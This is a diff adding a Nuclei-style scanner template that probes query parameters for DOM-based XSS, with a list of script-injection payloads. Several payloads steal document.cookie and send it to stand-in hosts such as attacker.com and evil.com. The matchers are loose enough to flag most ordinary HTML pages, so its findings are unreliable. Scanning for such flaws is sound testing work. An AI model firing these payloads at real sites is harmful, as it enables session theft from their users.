@@ -1,0 +1,96 @@
+id: dom-xss
+
+info:
+  name: DOM-based XSS Detection (Fragment-based)
+  author: custom
+  severity: high
+  description: Detects DOM-based XSS vulnerability using URL fragment manipulation and script injection
+  tags: xss,dom-xss,fragment,custom
+
+variables:
+  random: "{{1}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?q={{payload}}"
+      - "{{BaseURL}}?search={{payload}}"
+      - "{{BaseURL}}?param={{payload}}"
+      - "{{BaseURL}}?query={{payload}}"
+      - "{{BaseURL}}?keyword={{payload}}"
+      - "{{BaseURL}}?input={{payload}}"
+      - "{{BaseURL}}?name={{payload}}"
+      - "{{BaseURL}}?id={{payload}}"
+
+    payloads:
+      payload:
+        # Basic DOM XSS with fragment
+        - '<script%20id=name></script>#alert({{random}});//'
+        - '<script%20id="test"></script>#alert({{random}});//'
+
+        # Cookie exfiltration via fragment
+        - '<script id="name"></script>#location.href="/memo?memo="+document.cookie;//'
+        - '<script%20id=x></script>#location.href="/log?data="+document.cookie;//'
+        - '<script%20id=exploit></script>#location.href="//attacker.com?c="+document.cookie;//'
+
+        # Fragment with eval and assignment
+        - '<script%20id=a></script>#eval(atob("YWxlcnQoMSk="));//'
+        - '<script%20id=b></script>#window.location=document.cookie;//'
+
+        # DOM clobbering + fragment execution
+        - '<script%20id=payload></script>#alert(document.domain);//'
+        - '<script%20id=test></script>#console.log(document.cookie);//'
+
+        # innerHTML manipulation
+        - '<script%20id=vuln></script>#document.body.innerHTML="<img src=x onerror=alert({{random}})>";//'
+        - '<script%20id=exploit></script>#document.write("<script>alert({{random}})</script>");//'
+
+        # Multiple script tags
+        - '<script%20id=x></script><script%20id=y></script>#alert({{random}});//'
+
+        # Fragment with fetch/xhr
+        - '<script%20id=fetch></script>#fetch("//attacker.com?"+document.cookie);//'
+        - '<script%20id=xhr></script>#new%20Image().src="//evil.com?c="+document.cookie;//'
+
+        # Encoded variations
+        - '<script%20id=%22name%22></script>#alert({{random}});//'
+        - '<script%20id=&#x6e;ame></script>#alert({{random}});//'
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: dom-xss-script-reflection
+        dsl:
+          - 'contains(body, "<script")'
+          - 'contains(body, "id=")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: dom-vulnerable-code-pattern
+        dsl:
+          - 'contains(body, "location.hash")'
+          - 'contains(body, ".innerHTML")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: dom-fragment-processing
+        dsl:
+          - 'contains(body, "window.location.hash")'
+          - 'contains(body, "document.getElementById")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: dom-clobbering-vulnerable
+        dsl:
+          - 'regex("id=[\"'']?(name|test|payload|vuln|exploit)[\"'']?", body)'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
